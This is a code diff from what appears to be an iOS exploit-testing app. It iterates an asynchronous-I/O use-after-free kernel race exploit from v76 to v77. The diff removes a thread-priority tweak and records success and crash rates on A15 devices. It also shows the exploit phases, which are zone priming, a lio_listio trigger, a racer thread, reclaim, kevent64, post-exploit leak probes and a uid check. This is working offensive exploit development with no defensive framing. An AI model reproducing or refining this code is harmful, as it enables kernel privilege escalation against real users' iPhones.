@@ -343,18 +343,15 @@ static void *v63_racer(void *arg) {
     return NULL;
 }
 
-// v76: Faithful v63 clone. v63 was the only version with reliable Phase A
-// on A15 (cold phone: ~80%+ success, hot phone: throttling widens race window).
-// v64-v75 all degraded by adding unnecessary complexity. v76 restores v63
-// exactly, with one addition: THREAD_PRECEDENCE_POLICY.
-static void *v76_exploit_thread(void *arg) {
+// v77: Pure v63 clone — NO additions. v61 and v76 both proved THREAD_PRECEDENCE_POLICY
+// causes 100% crash rate when combined with THREAD_AFFINITY_POLICY on A15.
+// v77 removes it entirely. If this still crashes, the problem is intrinsic to the
+// race window on this specific device/OS combination.
+static void *v77_exploit_thread(void *arg) {
     struct v63_state *st = (struct v63_state *)arg;
     aio_set_thread_affinity(42);
 
-    // v76: THREAD_PRECEDENCE_POLICY — v63 didn't have this, worth trying
-    thread_precedence_policy_data_t prec = { .importance = 63 };
-    thread_policy_set(mach_thread_self(), THREAD_PRECEDENCE_POLICY,
-                      (thread_policy_t)&prec, THREAD_PRECEDENCE_POLICY_COUNT);
+    // v77: NO THREAD_PRECEDENCE_POLICY — v61/v76 proved it regresses reliability.
 
     // v63: 7x Zone priming.
     struct aiocb pcbs[7];
@@ -540,7 +537,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v76" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v77" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -6247,12 +6244,12 @@ static void *e2_free_and_ool_racer(void *arg) {
 
 // Phase 0 (pre-exploit): EMPTY — preserve pristine zone state
 - (void)runPhase0Dummy {
-    // v76: No probes. Keep zone state pristine for race reliability.
+    // v77: No probes. Keep zone state pristine for race reliability.
 }
 
 // Phase D (post-exploit): ALL leak probes — exploit done, zone disturbance irrelevant
 - (void)runPostExploitLeakProbe {
-    [self appendLog:@"\n=== Phase D v76: Post-Exploit Full Leak Probe ==="];
+    [self appendLog:@"\n=== Phase D v77: Post-Exploit Full Leak Probe ==="];
 
     [self appendLog:@"\n-- PhaseD.A: sysctl net.inet.tcp.info --"];
     @try { [self subtestSysctlTcpInfo]; }
@@ -6297,10 +6294,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v76 (Faithful v63 Clone + Thread Priority) =========="];
+    [self appendLog:@"\n========== AIO UAF v77 (Pure v63 Clone — No Additions) =========="];
 
-    // ---- Phase 0 v76: Empty ----
-    [self appendLog:@"\n--- Phase 0 v76: (empty) ---"];
+    // ---- Phase 0 v77: Empty ----
+    [self appendLog:@"\n--- Phase 0 v77: (empty) ---"];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -6313,13 +6310,13 @@ static void *e2_free_and_ool_racer(void *arg) {
         @autoreleasepool {
 
     // v63: Single 64KB file, no F_NOCACHE (faithful v44/v58/v63 config).
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v76.bin"];
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v77.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v76" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v77" forState:UIControlStateNormal];
         });
         return;
     }
@@ -6331,8 +6328,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"fd=%d(64KB) pid=%d uid=%d", fd, getpid(), getuid()]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v76: v63 faithful — 7x prime → lio_listio trigger → racer(500us) → lio_listio batch reclaim → wait → kevent64 ----
-    [self appendLog:@"\n--- Phase A v76: 7x prime → lio_listio trigger → racer(500us) → lio_listio batch reclaim → wait → kevent64 ---"];
+    // ---- Phase A v77: Pure v63 — 7x prime → lio_listio trigger → racer(500us) → lio_listio batch reclaim → wait → kevent64 ----
+    [self appendLog:@"\n--- Phase A v77: 7x prime → lio_listio trigger → racer(500us) → lio_listio batch reclaim → wait → kevent64 ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6342,7 +6339,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         st.fd = fd;
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v76_exploit_thread, &st);
+        pthread_create(&thr, NULL, v77_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         if (st.err != 0) {
@@ -6393,8 +6390,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v76: Health check ----
-    [self appendLog:@"\n--- Phase C v76: Health check ---"];
+    // ---- Phase C v77: Health check ----
+    [self appendLog:@"\n--- Phase C v77: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6420,11 +6417,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v76 Complete =========="];
+    [self appendLog:@"========== AIO UAF v77 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v76" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v77" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
